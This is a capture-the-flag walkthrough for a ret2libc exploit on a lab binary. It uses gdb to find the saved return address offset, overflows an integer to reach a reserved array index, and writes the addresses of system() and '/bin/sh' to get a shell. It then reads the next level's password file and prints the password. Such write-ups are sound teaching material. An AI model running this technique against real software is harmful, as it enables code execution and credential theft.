HOW TO FIND THE FLAG:

After analysing the binary file and reverse engineered it we can see there is three commands in the programm ; store, read and quit

The store command allows us to store unsigned int at a certain index (but there is some indexes that are reserved)

The read command allows us to read the unsigned int we stored by giving the index.

quit exits the programm.

The goal here is to exploit the program with a ret2libc attack and try execute the system function with the argument "/bin/sh"

In order to do that we need to find where to write the adress of system and the adress of "/bin/sh"

Let's find the offset.

First we are searching for the adress of the eip

b main -> r -> info frame ->

Stack level 0, frame at 0xffffd720:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd718, args: 
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebp at 0xffffd718, eip at 0xffffd71c

Adress of our eip is 0xffffd71c

Now let's find the adress of the buffer in order to substract the two values and find the number of bytes between them.

b read_number -> r -> x/x $ebp + 0x8 -> Adress is 0xffffd554

(gdb) p 0xffffd71c - 0xffffd554
$1 = 456

There is 456 bytes between adress of eip and beginning of our buffer. So as it is a pointer of unsigned int we divide the value by 4 -> 456 / 4 = 114.

So we are going to write the adress of system at the index 114 and the adress of "/bin/sh" at the index 116.

The problem is that we saw that the index 114 is reserved (114 % 3 == 0) so we are going to use the integer overflow to write to index 114.

So we take the unsigned int max to write to 0 + 114 -> (4294967296 / 4) + 114 -> 1073741938

We need the address of system in decimal -> 

(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr

(gdb) p/d 0xf7e6aed0
$5 = 4159090384

Then we need to find the address of "/bin/sh"

(gdb) info proc map

(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.


(gdb) p/d 0xf7f897ec
$6 = 4160264172


1. Store 4159090384 at index 1073741938 ( 114)
2. Store 4160264172 at index 116
3. Quit the loop in order to execute the eip


Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

Success
